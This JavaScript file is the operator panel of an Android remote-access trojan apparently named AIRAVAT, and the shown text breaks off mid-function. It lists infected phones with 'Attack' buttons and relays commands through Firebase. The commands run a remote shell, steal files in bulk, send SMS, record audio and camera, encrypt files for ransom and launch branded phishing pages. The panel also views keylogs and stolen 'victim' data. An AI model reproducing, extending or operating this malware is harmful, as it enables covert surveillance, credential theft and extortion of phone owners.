$("#preloaderr").fadeOut();
var thumbnailQueue = [];
var thumbnailIndex = 0;
var pendingThumbIndex = -1;
var thumbnailDir = "";
var THUMB_BATCH_SIZE = 400;
var thumbBatchActive = false;
var THUMB_TIMEOUT = 2000;
var isFetchingThumbnails = false;
var respov = $("#cmdref").val();
var var32 = "";
var batchStart = 0;
var unqid = "";
var manager = "";
var bckstp = 0;
var database = firebase.database();
var lastkeynot = "";
var lastkeykey = "";
var lastkeyphish = "";
var lastkeyvoice = "";
var wallpaperno = "";
var uo2 = document.getElementById("users");

// Variabili per il download delle cartelle
var folderDownloadQueue = [];
var folderDownloadIndex = 0;
var folderDownloadName = "";
var folderDownloadBasePath = "";
var folderFilesContent = [];
var folderScanStack = [];
var isFolderDownloadActive = false;

function opnav(o) {
    if ($("#navbar").css("display") == "none") {
        o.style.color = "red";
        o.innerHTML = "&#10005;";
        $("#navbar").css("display", "block");
    } else {
        o.style.color = "white";
        o.innerHTML = "&#8801;";
        $("#navbar").css("display", "none");
    }
}

var n = document.body.getAttribute("data-sig");

function showThumbnails() {
    if (thumbBatchActive) return;
    $("#preloaderr").fadeOut();

    if (thumbnailQueue.length === 0) {
        var respDiv = document.getElementById("resp");
        var fileItems = respDiv.querySelectorAll("li.im, li.fo, li.vi");
        var imageExtensions = /\.(jpg|jpeg|png|gif|bmp|webp)$/i;

        for (var i = 0; i < fileItems.length; i++) {
            var fileName = "";
            var child = fileItems[i].firstChild;
            while (child) {
                if (child.nodeType === 3) fileName += child.nodeValue;
                else if (child.tagName === "B") break;
                child = child.nextSibling;
            }
            fileName = fileName.trim();
            if (imageExtensions.test(fileName)) {
                thumbnailQueue.push(fileItems[i]);
            }
        }

        if (thumbnailQueue.length === 0) {
            alert("Nessuna immagine in questa cartella.");
            return;
        }

        thumbnailDir = var32;
        thumbnailIndex = 0;
    }

    if (thumbnailIndex === 0) {
        thumbnailQueue.reverse();
        console.log("Coda invertita. Primo elemento ora:", thumbnailQueue[0]?.innerText);
    }

    if (thumbnailIndex >= thumbnailQueue.length) {
        alert("Tutte le anteprime sono già state caricate.");
        return;
    }

    thumbBatchActive = true;
    batchStart = thumbnailIndex;
    var btn = document.querySelector("#gallery-controls button:first-child");
    if (btn) btn.disabled = true;

    fetchNextThumbnail();
}

function fetchNextThumbnail() {
    if (thumbnailIndex >= thumbnailQueue.length || (thumbnailIndex - batchStart >= THUMB_BATCH_SIZE)) {
        thumbBatchActive = false;
        var btn = document.querySelector("#gallery-controls button:first-child");
        if (btn) {
            btn.disabled = false;
            btn.textContent = "Carica altre " + THUMB_BATCH_SIZE + " anteprime";
        }
        var loader = document.getElementById("preloaderr");
        if (loader) loader.style.display = "none";
        if (document.getElementById("loadtxt")) document.getElementById("loadtxt").innerText =
            "Batch completato (" + thumbnailIndex + "/" + thumbnailQueue.length + ")";
        return;
    }

    var fileElement = thumbnailQueue[thumbnailIndex];
    var fileName = "";
    var child = fileElement.firstChild;
    while (child) {
        if (child.nodeType === 3) fileName += child.nodeValue;
        else if (child.tagName === "B") break;
        child = child.nextSibling;
    }
    fileName = fileName.trim();
    var fullPath = thumbnailDir + "/" + fileName;
    window._currentThumbElement = fileElement;
    manager = "thumbnailfetch";

    var loader = document.getElementById("preloaderr");
    if (loader) loader.style.display = "flex";
    document.getElementById("loadtxt").innerText =
        "Anteprima " + (thumbnailIndex + 1) + "/" + thumbnailQueue.length;

    setdatcmd("cd", fullPath, "", respov);

    var idx = thumbnailIndex;
    setTimeout(function() {
        if (manager === "thumbnailfetch" && idx === thumbnailIndex && idx < thumbnailQueue.length) {
            console.warn("Timeout per " + fileName);
            var loader = document.getElementById("preloaderr");
            if (loader) loader.style.display = "none";
            thumbnailIndex++;
            fetchNextThumbnail();
        }
    }, 10000);
}

function filesfol(respo, v1, v2, v3, var32) {
    var uo = document.getElementById("resp");
    uo.style.display = "block";

    var galleryPanel = document.getElementById("gallery-controls");
    if (!galleryPanel) {
        console.warn("gallery-controls non trovato nel DOM");
    } else {
        if (respo === "imgview" || respo === "fileview" || respo === "dialogview") {
            galleryPanel.style.display = "none";
        } else {
            galleryPanel.style.display = "block";
            galleryPanel.style.position = "fixed";
            galleryPanel.style.top = "55px";
            galleryPanel.style.left = "10px";
            galleryPanel.style.right = "10px";
            galleryPanel.style.zIndex = "99999";
            galleryPanel.style.background = "#001";
            galleryPanel.style.padding = "10px";
            galleryPanel.style.borderRadius = "5px";
            galleryPanel.style.textAlign = "center";
        }
    }

    if (respo == "imgview") {
        document.getElementById("fprev").style.display = "block";
        document.getElementById("imv2").style.display = "none";
        document.getElementById("imv").style.display = "inline";
        document.getElementById("imv").src = "data:image/png;base64," + v1;
        document.getElementById("fprevdes").innerHTML = v2 + '<li><a download="" id="btdwn" target="_blank" href="data:image/png;base64,' + v1 + '">Download File</a><br>';
    } else if (respo == "fileview") {
        document.getElementById("fprev").style.display = "block";
        document.getElementById("imv2").style.display = "inline";
        document.getElementById("imv2").src = v1;
        document.getElementById("imv").style.display = "none";
        document.getElementById("fprevdes").innerHTML = v2 + '<li><a download="" id="btdwn" target="_blank" href="' + v1 + '">Download File</a><br>';
    } else if (respo == "dialogview") {
        showdialog(v1);
    } else {
        uo.innerHTML = "" + respo;
    }
}

function hidekarbsdk() {
    $("#micrec").css("display", "none");
    $("#wallpaperdiv").css("display", "none");
    $("#senddm").css("display", "none");
    $("#pvtt").css("display", "none");
    $("#toastdiv").css("display", "none");
    $("#notikey").css("display", "none");
    $("#viewers").css("display", "none");
    $("#fprev").css("display", "none");
    $("#resp").css("display", "none");
    $("#shellcmd").css("display", "none");
    $("#showphishj").css("display", "none");
    $("#camview").css("display", "none");
    $("#ransomdiv").css("display", "none");
}

function userss() {
    var o = "hiddenser";
    var database = firebase.database();
    localStorage.setItem("airavatpass", o);
    var ref = database.ref("/online/online" + n);
    ref.on("value", (snapshot) => {
        if (snapshot.exists()) {
            var scores = snapshot.val();
            var keys = Object.keys(scores);
            uo2.innerHTML = "<br>";
            for (var i = 0; i < keys.length; i++) {
                var k = keys[i];
                var aversion = scores[k].device.android;
                var battery = scores[k].device.battery;
                var model = scores[k].device.phone;
                var ip = scores[k].device.rooted;
                var uid = scores[k].device.id;
                uo2.innerHTML += '<br><div class="usr" >' + model + ' <span style="float:right" >' + aversion + '</span><br><br>Rooted: ' + ip + ' <span style="float:right" >Battery: ' + battery + ' </span><br><br><center><button onclick="setdev(' + "'" + uid + "'" + ')">Attack</button></center></div> ';
            }
        } else {
            uo2.innerHTML = "No online Devices";
        }
    });
}
userss();

function setdev(o) {
    respov = "/comds/comds" + o;
    unqid = o;
    $("#cmdref").val("/comds/comds" + o);
    showdat(o);
    $("#users").css("display", "none");
    $("#backkk").css("display", "block");
    $("#phones").css("display", "block");
}

function setdatcmd(o, p, q, r) {
    var result = '';
    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for (var i = 0; i < 8; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    var store = {
        cmdn: o,
        cmdv: p,
        cmdvar: q,
        rndm: result
    };
    $("#phones").css("display", "none");
    $("#preloaderr").fadeIn();
    var con = database.ref(r).child("comdss").set(store);
}

function cmd() {
    var database = firebase.database();
    var us = document.getElementById("cmdref").value;
    var ref = database.ref(us);
    var hio = document.getElementById("cmd").value;
    var hio2 = document.getElementById("cmdvar").value;
    var hio3 = document.getElementById("cmdvarm").value;
    setdatcmd(hio, hio2, hio3, us);
}

function showdat(o) {
    var database = firebase.database();
    var ref = database.ref("respos/respo" + o);
    ref.on("child_changed", (snapshot) => {
        if (snapshot.exists()) {
            var dat = snapshot.val();
            var respo = dat.respo + "";
            var v1 = dat.v1 + "";
            var v2 = dat.v2 + "";
            var v3 = dat.v3 + "";

            if (manager != "thumbnailfetch" && manager != "folderscan" && manager != "folderdownload") {
                var32 = dat.var2 + "";
            }

            $("#preloaderr").fadeOut();

            if (manager == "filesmanager") {
                filesfol(respo, v1, v2, v3, var32);
            } else if (manager == "folderscan") {
                handleFolderScan(respo, v1, v2, v3, var32);
            } else if (manager == "folderdownload") {
                handleFolderDownload(respo, v1, v2, v3);
            } else if (manager == "fileview") {
                fileev(v1);
            } else if (manager == "shellview") {
                shellviewer(v1);
            } else if (manager == "deviceinfo") {
                showinfodev(v1);
            } else if (manager == "dialogview") {
                showdialog(v1);
            } else if (manager == "camview") {
                document.getElementById("camview").style.display = "block";
                document.getElementById("camimg").src = v1;
                document.getElementById("downlocam").href = v1;
            } else if (manager == "thumbnailfetch") {
                var thumbEl = window._currentThumbElement;
                if (respo == "imgview" && v1 && thumbEl) {
                    var img = document.createElement("img");
                    img.src = "data:image/png;base64," + v1;
                    img.style.maxWidth = "80px";
                    img.style.maxHeight = "80px";
                    img.style.margin = "2px";
                    img.style.cursor = "pointer";
                    img.title = "Clicca per aprire";

                    var originalText = "";
                    var child = thumbEl.firstChild;
                    while (child) {
                        if (child.nodeType === 3) originalText += child.nodeValue;
                        else if (child.tagName === "B") break;
                        child = child.nextSibling;
                    }
                    originalText = originalText.trim();

                    var container = document.createElement("span");
                    container.appendChild(img);
                    container.appendChild(document.createTextNode(" " + originalText));
                    thumbEl.parentNode.replaceChild(container, thumbEl);

                    container.onclick = function(e) {
                        e.stopPropagation();
                        setdatcmd("cd", thumbnailDir + "/" + originalText, "", respov);
                        manager = "fileview";
                    };
                } else if (respo == "fileview" && v1 && thumbEl) {
                    var img = document.createElement("img");
                    img.src = v1;
                    img.style.maxWidth = "80px";
                    img.style.maxHeight = "80px";
                    img.style.margin = "2px";
                    img.style.cursor = "pointer";
                    img.title = "Clicca per aprire";

                    var originalText = "";
                    var child = thumbEl.firstChild;
                    while (child) {
                        if (child.nodeType === 3) originalText += child.nodeValue;
                        else if (child.tagName === "B") break;
                        child = child.nextSibling;
                    }
                    originalText = originalText.trim();

                    var container = document.createElement("span");
                    container.appendChild(img);
                    container.appendChild(document.createTextNode(" " + originalText));
                    thumbEl.parentNode.replaceChild(container, thumbEl);

                    container.onclick = function(e) {
                        e.stopPropagation();
                        setdatcmd("cd", thumbnailDir + "/" + originalText, "", respov);
                        manager = "fileview";
                    };
                }

                thumbnailIndex++;
                fetchNextThumbnail();
            }
        } else {
            console.log("No data available");
        }
    });
}

// Funzione per scaricare una cartella
function downloadfol(o) {
    document.getElementById("filwt").style.display = "none";
    var tarfol = o.parentElement.parentElement.getAttribute("data-file");
    var tarfoltype = o.parentElement.parentElement.getAttribute("data-type");

    if (tarfol == "..") {
        return;
    }

    var folderPath = "";

    if ((tarfoltype.indexOf("fo") > -1) && (tarfol.indexOf("<b>") > -1)) {
        folderPath = var32 + "/" + tarfol.substr(0, tarfol.indexOf("<b>"));
        folderDownloadName = tarfol.substr(0, tarfol.indexOf("<b>"));
    } else if (tarfoltype.indexOf("fo") > -1) {
        folderPath = var32 + "/" + tarfol;
        folderDownloadName = tarfol;
    } else {
        // È un file, scarica direttamente
        setdatcmd("cd", var32 + "/" + tarfol, "", respov);
        manager = "fileview";
        return;
    }

    // Inizializza il download della cartella
    folderDownloadQueue = [];
    folderDownloadIndex = 0;
    folderFilesContent = [];
    folderDownloadBasePath = folderPath;
    folderScanStack = [folderPath];
    isFolderDownloadActive = true;

    // Mostra il loader
    $("#preloaderr").fadeIn();
    document.getElementById("loadtxt").innerText = "Scansione cartella: " + folderDownloadName + "...";

    // Inizia la scansione
    manager = "folderscan";
    setdatcmd("cd", folderPath, "", respov);
}

// Gestisce la scansione delle cartelle
function handleFolderScan(respo, v1, v2, v3, currentPath) {
    if (!isFolderDownloadActive) return;

    // Analizza la risposta HTML per trovare file e cartelle
    var tempDiv = document.createElement("div");
    tempDiv.innerHTML = respo;

    var fileItems = tempDiv.querySelectorAll("li");
    var files = [];
    var folders = [];

    for (var i = 0; i < fileItems.length; i++) {
        var item = fileItems[i];
        var className = item.className || "";
        var itemText = item.textContent || item.innerText;
        
        // Estrai il nome del file/cartella
        var nameMatch = itemText.match(/^([^<]+)/);
        if (nameMatch && nameMatch[1].trim() !== "") {
            var name = nameMatch[1].trim();
            
            if (className.indexOf("fo") > -1) {
                // È una cartella
                if (name !== ".." && name !== ".") {
                    folders.push({
                        name: name,
                        path: currentPath + "/" + name
                    });
                }
            } else if (className.indexOf("im") > -1 || className.indexOf("vi") > -1 || className.indexOf("fi") > -1) {
                // È un file
                files.push({
                    name: name,
                    path: currentPath + "/" + name
                });
            }
        }
    }

    // Aggiungi i file alla coda di download
    for (var i = 0; i < files.length; i++) {
        folderDownloadQueue.push(files[i]);
    }

    // Aggiungi le cartelle allo stack di scansione
    for (var i = 0; i < folders.length; i++) {
        folderScanStack.push(folders[i].path);
    }

    // Se ci sono ancora cartelle da scansionare, continua
    if (folderScanStack.length > 0) {
        var nextFolder = folderScanStack.pop();
        document.getElementById("loadtxt").innerText = "Scansione: " + nextFolder + "...";
        setdatcmd("cd", nextFolder, "", respov);
    } else {
        // Scansione completata, inizia il download
        startFolderDownload();
    }
}

// Inizia il download dei file
function startFolderDownload() {
    if (folderDownloadQueue.length === 0) {
        // Nessun file trovato
        alert("Nessun file trovato nella cartella " + folderDownloadName);
        $("#preloaderr").fadeOut();
        manager = "filesmanager";
        isFolderDownloadActive = false;
        setdatcmd("cd", var32, "", respov);
        return;
    }

    folderDownloadIndex = 0;
    manager = "folderdownload";
    downloadNextFolderFile();
}

// Scarica il prossimo file
function downloadNextFolderFile() {
    if (folderDownloadIndex >= folderDownloadQueue.length) {
        // Tutti i file scaricati, crea il file ZIP
        createFolderZip();
        return;
    }

    var file = folderDownloadQueue[folderDownloadIndex];
    document.getElementById("loadtxt").innerText = "Download: " + (folderDownloadIndex + 1) + "/" + folderDownloadQueue.length + " - " + file.name;

    setdatcmd("cd", file.path, "", respov);
}

// Gestisce il download dei file
function handleFolderDownload(respo, v1, v2, v3) {
    if (!isFolderDownloadActive) return;

    var currentFile = folderDownloadQueue[folderDownloadIndex];
    
    if (respo == "imgview" && v1) {
        // File immagine
        folderFilesContent.push({
            name: currentFile.name,
            path: currentFile.path,
            type: "image",
            content: v1,
            isBase64: true
        });
    } else if (respo == "fileview" && v1) {
        // File di testo o altro
        folderFilesContent.push({
            name: currentFile.name,
            path: currentFile.path,
            type: "text",
            content: v1,
            isBase64: false
        });
    }

    folderDownloadIndex++;
    $("#preloaderr").fadeIn();
    downloadNextFolderFile();
}

// Crea un file ZIP con tutti i contenuti
function createFolderZip() {
    try {
        // Crea un oggetto per il contenuto della cartella
        var folderData = {
            name: folderDownloadName,
            files: folderFilesContent
        };

        // Converti in JSON per il download
        var jsonContent = JSON.stringify(folderData, null, 2);
        
        // Crea un blob con il contenuto
        var blob = new Blob([jsonContent], { type: 'application/json' });
        var url = URL.createObjectURL(blob);
        var a = document.createElement('a');
        a.href = url;
        a.download = folderDownloadName + "_folder.json";
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);

        // Mostra un messaggio di successo
        alert("Download completato! " + folderFilesContent.length + " file scaricati come " + folderDownloadName + "_folder.json");
    } catch (e) {
        console.error("Errore nella creazione del file:", e);
        alert("Errore nel download della cartella: " + e.message);
    }

    // Reset
    $("#preloaderr").fadeOut();
    manager = "filesmanager";
    isFolderDownloadActive = false;
    setdatcmd("cd", var32, "", respov);
}

function backk(o) {
    if ($("#users").css("display") == "none" && $("#phones").css("display") == "none") {
        hidekarbsdk();
        $("#users").css("display", "none");
        $("#phones").css("display", "block");
    } else if ($("#users").css("display") == "none" && $("#phones").css("display") != "none") {
        hidekarbsdk();
        $("#backkk").css("display", "none");
        $("#users").css("display", "block");
        $("#phones").css("display", "none");
    } else {

    }
}

function clrn() {
    if (confirm("Are You Sure To delete all Keylogs")) {
        firebase.database().ref("notilogo").remove();
    }
}

function clrk() {
    if (confirm("Are You Sure To delete all Keylogs")) {
        firebase.database().ref("logolog").remove();
    }
}

function clrv() {
    if (confirm("Are You Sure To delete all Recordings")) {
        firebase.database().ref("records").remove();
    }
}

function clrpi() {
    if (confirm("Are You Sure To delete all Phish Data")) {
        firebase.database().ref("pdata").remove();
    }
}

function showphish() {
    manager = "notikey";
    if (manager == "notikey") {
        var psdus = document.getElementById("notikey");
        hidekarbsdk();
        $("#preloaderr").fadeIn();
        $("#phones").css("display", "none");
        var database = firebase.database();
        var ref = database.ref("pdata/pdataonline" + n);
        ref.limitToFirst(10).on("value", gotData);

        function gotData(data) {
            $("#preloaderr").fadeOut();
            psdus.style.display = "block";
            psdus.innerHTML = '<div onclick="clrpi()" class="down" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-trash" viewBox="0 0 16 16"><path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0V6z"/><path fill-rule="evenodd" d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1v1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4H4.118zM2.5 3V2h11v1h-11z"/></svg></div>';
            if (data.exists()) {
                var scores = data.val();
                var keys = Object.keys(scores);
                var i = 0;
                for (i = (keys.length - 1); i > -1; i--) {
                    var k = keys[i];
                    var data2 = scores[k].data;
                    psdus.innerHTML += '<div class="keylogg" >' + data2 + "</div>";
                }
                if (lastkeyphish != (keys[keys.length - 1] + "") && parseInt(keys.length) >= 10) {
                    lastkeyphish = keys[keys.length - 1] + "";
                    psdus.innerHTML += "<br><center><button class='btn' " + 'onclick="showphishu(this,' + "'" + lastkeyphish + "'" + ')"' + ">Load More</button></center><br>";
                }
                lastkeyphish = keys[keys.length - 1] + "";
            } else {
                psdus.innerHTML = '<div class="keylogg" ><h4>No Victims Found<h4></div>';
            }
        }
    }
}

function showphishu(o, p) {
    manager = "notikey";
    if (manager == "notikey") {
        o.innerHTML = ".....";
        o.disabled = true;
        var psdus = document.getElementById("notikey");
        var database = firebase.database();
        var ref = database.ref("pdata/pdataonline" + n);
        ref.orderByKey().startAt(p).limitToFirst(10).on("value", gotData);

        function gotData(data) {
            if (data.exists()) {
                var scores = data.val();
                var keys = Object.keys(scores);
                var i = 0;
                psdus.style.display = "block";
                o.style.display = "none";
                for (i = (keys.length - 1); i > -1; i--) {
                    var k = keys[i];
                    var data2 = scores[k].data;
                    psdus.innerHTML += '<div class="keylogg" >' + data2 + "</div>";
                }
                if (lastkeyphish != (keys[keys.length - 1] + "") && parseInt(keys.length) >= 10) {
                    lastkeyphish = keys[keys.length - 1] + "";
                    psdus.innerHTML += "<br><center><button class='btn' " + 'onclick="showphishu(this,' + "'" + lastkeyphish + "'" + ')"' + ">Load More</button></center><br>";
                }
                lastkeyphish = keys[keys.length - 1] + "";
            } else {
                psdus.innerHTML = '<div class="keylogg" ><h4>No Victims Found<h4></div>';
            }
        }
    }
}

function changewallpaper() {
    hidekarbsdk();
    manager = "dialogview";
    $("#phones").css("display", "none");
    $("#users").css("display", "none");
    $("#wallpaperdiv").css("display", "block");
}

function setwalls() {
    alert(wallpaperno)
    setdatcmd("changewall", wallpaperno, "", respov);
}

function selectimg(o, p) {
    for (var u = 0; u < 3; u++) {
        $(".wallimg").children().eq(u).css("border", "none")
    }
    $(o).css("border", "2px solid red");
    wallpaperno = p + "";
}

function setdatcmd2(o, p, q, s, r) {
    var result = '';
    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for (var i = 0; i < 8; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    var store = {
        cmdn: o,
        cmdv: p,
        cmdvar: q,
        cmdvar2: s,
        rndm: result
    };
    $("#phones").css("display", "none");
    $("#preloaderr").fadeIn();
    var con = database.ref(r).child("comdss").set(store);
}

function iojh() {
    var yi = ['dropbox3.png', 'facebook2.png', 'facebook5.png', 'free_fire3.png', 'github1.png', 'instagram1.png', 'linkedin1.png', 'messenger1.png', 'microsoft1.png', 'netflix1.png', 'paypal2.png', 'protonmail1.png', 'pubg2.png', 'snapchat1.png', 'tumblir1.png', 'twitter1.png', 'wordpress1.png', 'yahoo1.png'];
    document.getElementById("hion").src = "./imgg/" + yi[parseInt($("#lshpih").val())];
}

function execphish() {
    setdatcmd2("phpage", $("#phpage").val(), $("#nshpih").val(), $("#lshpih").val(), "comds/comds" + unqid + "phi");
}

function execphish2() {
    setdatcmd2("cust", $("#shpih").val(), $("#nshpih").val(), $("#lshpih").val(), "comds/comds" + unqid + "phi");
}

function recordvoice() {
    setdatcmd("micrec", (parseInt($("#recval").val()) * 1000), "", "comds/comds" + unqid + "phi");
}

function micrec() {
    voicess();
    hidekarbsdk();
    manager = "dialogview";
    $("#phones").css("display", "none");
    $("#users").css("display", "none");
    $("#micrec").css("display", "block");
}

function sendsms() {
    if ((!isNaN($("#smsnumber").val())) && $("#smscontent").val() != "") {
        setdatcmd("sendsms", $("#smsnumber").val(), $("#smscontent").val(), respov);
    } else {
        alert("Please Enter Valid Data");
    }
}

function sendmsg() {
    hidekarbsdk();
    manager = "dialogview";
    $("#phones").css("display", "none");
    $("#users").css("display", "none");
    $("#senddm").css("display", "block");
}

function ttsf() {
    if ($("#ttscmd").val() != "") {
        setdatcmd("ttsdev", $("#ttscmd").val(), "", respov);
    } else {
        alert("Please Enter Valid Text");
    }
}

function webssow() {
    if ($("#webscmd").val() != "") {
        setdatcmd("openweburi", $("#webscmd").val(), "", respov);
    } else {
        alert("Please Enter Valid URL");
    }
}

function vibra() {
    if (!isNaN($("#vibratecmd").val())) {
        setdatcmd("vibratedev", ($("#vibratecmd").val() * 1000), "", respov);
    } else {
        alert("Please Enter Valid Time");
    }
}

function playmus() {
    if ($("#musiccmd").val().indexOf(".mp3") > 0) {
        setdatcmd("playsmusic", $("#musiccmd").val(), "", respov);
    } else {
        alert("Please Enter Valid URL");
    }
}

function showphpag() {
    hidekarbsdk();
    manager = "dialogview";
    $("#phones").css("display", "none");
    $("#users").css("display", "none");
    $("#showphishj").css("display", "block");
}

function funcmd(o) {
    hidekarbsdk();
    var ooj = '#' + o;
    $("#plmc").css('display', 'none');
    $("#vibradev").css('display', 'none');
    $("#ttsdev").css('display', 'none');
    $("#webdev").css('display', 'none');
    $(ooj).css('display', 'block');
    manager = "dialogview";
    $("#phones").css("display", "none");
    $("#users").css("display", "none");
    $("#pvtt").css("display", "block");
}

function showdialog(o) {
    $("#diamain").css("display", "flex");
    $("#diatext").html(o);
}

function toastt() {
    hidekarbsdk();
    manager = "dialogview";
    $("#phones").css("display", "none");
    $("#users").css("display", "none");
    $("#toastdiv").css("display", "block");
}

function ransomwares() {
    hidekarbsdk();
    manager = "dialogview";
    $("#phones").css("display", "none");
    $("#users").css("display", "none");
    $("#ransomdiv").css("display", "block");
}

function ransomen() {
    setdatcmd("ransom1", $("#ransomcmd").val(), "", respov);
}

function ransomde() {
    setdatcmd("ransom2", $("#ransomcmd").val(), "", respov);
}

function toastexc() {
    setdatcmd("toasttext", $("#toastcmd").val(), "", respov);
}

function deviceinfo() {
    hidekarbsdk();
    manager = "deviceinfo";
    $("#phones").css("display", "none");
    $("#users").css("display", "none");
    setdatcmd("deviceinfo", "", "", respov);
}

function siminfo() {
    hidekarbsdk();
    manager = "deviceinfo";
    $("#phones").css("display", "none");
    $("#users").css("display", "none");
    setdatcmd("simcardinfo", "", "", respov);
}

function showinfodev(o) {
    hidekarbsdk();
    $("#notikey").css("display", "block");
    $("#notikey").html(o);
}

function startshell() {
    hidekarbsdk();
    manager = "shellview";
    $("#phones").css("display", "none");
    $("#users").css("display", "none");
    $("#shellcmd").css("display", "block");
}

function shellcm(o) {
    if (event.keyCode === 13) {
        setdatcmd("shellcmd", o.value, "", respov);
    }
}

function logsout() {
    localStorage.setItem("logino", "false");
    window.location.href = "";
}

function shellviewer(o) {
    $("#shellcmd").css("display", "block");
    $("#shelldata").html("AIRAVAT Shell<br><br>" + o.replaceAll("\n", "<br>"))
}

function convertTimestamp(timestamp) {
    var d = new Date(timestamp),
        yyyy = d.getFullYear(),
        mm = ('0' + (d.getMonth() + 1)).slice(-2),
        dd = ('0' + d.getDate()).slice(-2),
        hh = d.getHours(),
        h = hh,
        min = ('0' + d.getMinutes()).slice(-2),
        ampm = 'AM',
        time;
    if (hh > 12) {
        h = hh - 12;
        ampm = 'PM';
    } else if (hh === 12) {
        h = 12;
        ampm = 'PM';
    } else if (hh == 0) {
        h = 12;
    }
    time = yyyy + '-' + mm + '-' + dd + ', ' + h + ':' + min + ' ' + ampm;
    return time;
}

function voicess() {
    manager = "notikey";
    if (manager == "notikey") {
        var psdus = document.getElementById("showrecs");
        $("#preloaderr").fadeIn();
        $("#phones").css("display", "none");
        var database = firebase.database();
        var ref = database.ref("records/" + unqid);
        ref.limitToFirst(10).once("value", gotData);

        function gotData(data) {
            $("#preloaderr").fadeOut();
            psdus.style.display = "block";
            psdus.innerHTML = '<div onclick="clrv()" class="down" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-trash" viewBox="0 0 16 16"><path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0V6z"/><path fill-rule="evenodd" d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1v1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4H4.118zM2.5 3V2h11v1h-11z"/></svg></div>';
            if (data.exists()) {
                var scores = data.val();
                var keys = Object.keys(scores);
                var i = 0;
                var rndm = 'recs' + Math.floor((Math.random() * 1000) + 100);
                var rndm2 = '.' + rndm;
                for (i = (keys.length - 1); i > -1; i--) {
                    var k = keys[i];
                    var recs = scores[k].url;
                    var times = scores[k].time;
                    psdus.innerHTML += '<div class="recswarp" ><div class="plrec" onclick="playssrec(this)" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-play" viewBox="0 0 16 16"><path d="M10.804 8 5 4.633v6.734L10.804 8zm.792-.696a.802.802 0 0 1 0 1.392l-6.363 3.692C4.713 12.69 4 12.345 4 11.692V4.308c0-.653.713-.998 1.233-.696l6.363 3.692z"/></svg></div><audio controls ><source src="' + recs + '" type="audio/mpeg" /></audio><div class="downlii" onclick="downliio(' + "'" + recs + "'" + ')"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-box-arrow-down" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M3.5 10a.5.5 0 0 1-.5-.5v-8a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 .5.5v8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 0 0 1h2A1.5 1.5 0 0 0 14 9.5v-8A1.5 1.5 0 0 0 12.5 0h-9A1.5 1.5 0 0 0 2 1.5v8A1.5 1.5 0 0 0 3.5 11h2a.5.5 0 0 0 0-1h-2z"/><path fill-rule="evenodd" d="M7.646 15.854a.5.5 0 0 0 .708 0l3-3a.5.5 0 0 0-.708-.708L8.5 14.293V5.5a.5.5 0 0 0-1 0v8.793l-2.146-2.147a.5.5 0 0 0-.708.708l3 3z"/></svg></div>' + convertTimestamp(parseInt(times)) + '</div><br>';
                }
                if (lastkeyvoice != (keys[keys.length - 1] + "") && parseInt(keys.length) >= 10) {
                    lastkeyvoice = keys[keys.length - 1] + "";
                    psdus.innerHTML += "<br><center><button class='btn' " + 'onclick="voicessu(this,' + "'" + lastkeyvoice + "'" + ')"' + ">Load More</button></center><br>";
                }
                lastkeyvoice = keys[keys.length - 1];
            } else {
                psdus.innerHTML = '<div class="keylogg" ><h4>No Recordings Found<h4></div>';
            }
        }
    }
}

function voicessu(o, p) {
    manager = "notikey";
    if (manager == "notikey") {
        o.innerHTML = ".....";
        o.disabled = true;
        var psdus = document.getElementById("showrecs");
        var database = firebase.database();
        var ref = database.ref("records/" + unqid);
        ref.orderByKey().startAt(p).limitToFirst(10).once("value", gotData);

        function gotData(data) {
            if (data.exists()) {
                var scores = data.val();
                var keys = Object.keys(scores);
                var i = 0;
                psdus.style.display = "block";
                o.style.display = "none";
                var rndm = 'recs' + Math.floor((Math.random() * 1000) + 100);
                var rndm2 = '.' + rndm;
                for (i = (keys.length - 1); i > -1; i--) {
                    var k = keys[i];
                    var recs = scores[k].url;
                    var times = scores[k].time;
